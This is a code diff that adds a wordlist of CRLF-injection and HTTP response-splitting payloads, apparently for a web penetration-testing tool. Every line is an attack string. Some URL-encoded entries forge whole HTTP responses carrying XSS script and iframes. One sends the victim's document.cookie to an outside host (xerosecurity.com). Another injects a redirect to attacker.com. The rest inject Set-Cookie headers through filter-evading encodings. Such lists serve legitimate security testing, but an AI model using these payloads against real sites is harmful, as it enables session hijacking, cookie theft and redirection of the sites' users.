@@ -1,0 +1,27 @@
+!URL
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLast-Modified%3A%20Fri%2C%2030%20Apr%202099%2011%3A11%3A18%20GMT%0aContent-Length%3A%2048%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLocation%3A%20http%3A%2F%2Fcrowdshield.com%0aContent-Length%3A%20122%0a%3Chtml%3E%3CBODY%20ONLOAD%3Dalert('XSS')%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%3B%22%3E%3C%2FIFRAME%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0aContent-Length%3A%2052%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0aContent-Length%3A%20769%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%22)%3B%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dwindow.location(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.html%22)%3B%3E%0a%3Cscript%3Elocation.href%3D'http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3F'%2Bdocument.cookie%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
+%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aLast-Modified%3A%20Fri%2C%2006%20Mar%202017%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+%0aSet-Cookie: INJECTX=INJECTX
+%0d%0aLocation:%20http://attacker.com
+%%0a0aSet-Cookie:crlf=injection
+%0aSet-Cookie:crlf=injection
+%0d%0aSet-Cookie:crlf=injection
+%0dSet-Cookie:crlf=injection
+%23%0aSet-Cookie:crlf=injection
+%23%0d%0aSet-Cookie:crlf=injection
+%23%0dSet-Cookie:crlf=injection
+%25%30%61Set-Cookie:crlf=injection
+%25%30aSet-Cookie:crlf=injection
+%250aSet-Cookie:crlf=injection
+%25250aSet-Cookie:crlf=injection
+%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
+%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
+%2F..%0d%0aSet-Cookie:crlf=injection
+%3f%0d%0aSet-Cookie:crlf=injection
+%3f%0dSet-Cookie:crlf=injection
+%u000aSet-Cookie:crlf=injection
+%0D%0A<html>
